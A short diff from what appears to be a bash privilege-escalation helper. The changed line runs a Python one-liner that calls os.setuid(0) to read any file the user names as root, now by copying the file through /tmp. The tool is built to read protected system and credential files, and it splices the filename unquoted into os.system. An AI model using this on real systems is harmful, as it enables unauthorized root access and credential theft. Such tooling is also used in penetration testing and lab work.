@@ -223,7 +223,7 @@ while true; do
                     *python*)
                         read -p "What file do you want to read ? : " FILE
                         echo "Trying with python3"
-                        "$choice" -c 'import os;os.setuid(0);print(open("'$FILE'").read())'
+                        "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
                         
                         read -p "Do you want to read another file? [y/N] : " answer
 
